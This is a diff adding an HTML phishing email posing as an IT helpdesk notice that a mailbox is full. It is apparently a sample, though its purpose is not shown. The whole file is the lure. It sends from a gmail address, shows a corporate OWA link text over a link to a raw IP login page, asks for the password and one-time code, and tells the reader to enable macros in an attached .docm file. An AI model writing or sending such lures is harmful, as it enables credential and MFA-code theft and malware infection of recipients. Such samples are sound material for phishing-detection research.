@@ -1,0 +1,10 @@
+From: IT Helpdesk <it.support.helpdesk@gmail.com>
+Subject: Action required: mailbox storage full
+
+<html><body>
+<p>Dear user,</p>
+<p>Your mailbox is full and will be deactivated. Sign in now to keep your emails:</p>
+<p><a href="http://185.234.12.9/owa/login.php">https://mail.company.com/owa</a></p>
+<p>Enter your password and OTP to re-activate your account.</p>
+<p>Open the attached Storage_Invoice.docm and enable macros.</p>
+</body></html>
